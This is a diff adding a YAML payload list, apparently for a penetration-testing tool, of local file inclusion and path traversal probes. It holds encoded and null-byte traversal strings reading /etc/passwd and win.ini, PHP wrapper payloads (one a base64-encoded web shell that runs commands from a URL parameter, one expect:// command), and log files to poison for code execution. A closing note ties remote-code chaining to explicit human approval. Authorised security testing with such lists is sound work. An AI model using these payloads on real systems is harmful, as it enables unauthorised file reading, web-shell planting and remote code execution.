@@ -1,0 +1,32 @@
+name: LFI / Path Traversal Payloads
+description: Local file inclusion probes - traversal depth, null bytes, stream wrappers
+
+path_traversal:
+  linux:
+    - "../../../../etc/passwd"
+    - "....//....//....//....//etc/passwd"
+    - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  windows:
+    - '..\..\..\..\windows\win.ini'
+    - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+
+null_byte:
+  - "../../../../etc/passwd%00"
+  - "../../../../etc/passwd%00.png"
+
+php_wrappers:
+  - "php://filter/convert.base64-encode/resource=index.php"
+  - "php://input"
+  - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
+  - "expect://id"
+  - "zip://shell.jpg%23payload.php"
+
+log_poisoning_targets:
+  - "/var/log/apache2/access.log"
+  - "/var/log/nginx/access.log"
+  - "/proc/self/environ"
+
+notes: >
+  Only chain log-poisoning or php:// wrapper payloads into RCE against a
+  target where the human has explicitly approved a HIGH-risk exploit attempt.
